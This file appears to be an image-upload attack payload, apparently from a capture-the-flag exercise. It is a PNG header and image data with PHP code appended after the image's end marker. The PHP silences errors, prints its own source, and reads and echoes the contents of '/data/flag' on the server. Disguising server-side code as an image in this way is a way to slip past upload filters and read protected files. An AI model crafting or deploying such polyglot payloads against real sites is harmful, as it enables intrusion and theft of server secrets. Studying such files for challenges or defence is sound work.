�PNG

   IHDR   8   !   =�   sRGB ���   gAMA  ���a   	pHYs  �  ��o�d   �IDATXG���
� E���O;a��UNL(]o�b��>��v�V�;��xW(J������J��B�lP"�X�Kl&�E���C�҄�r�	7��0!(J{��ڂ��4,th�AGU��f���������S������&��1�P��l1�ᠣ:���Q4�/"6j8�r�A�e��e����v�V�H��~�"-Ч���    IEND�B`�<?php
ini_set("display_error", false); 
error_reporting(0); 
highlight_file(__FILE__);
$file_handle = fopen("/data/flag","r");
if ($file_handle){
    //接着采用while循环一行行地读取文件，然后输出每行的文字
    while (!feof($file_handle)) {
        $line = fgets($file_handle);
        echo $line;
        echo "<br />";
    }
}
fclose($file_handle);
?>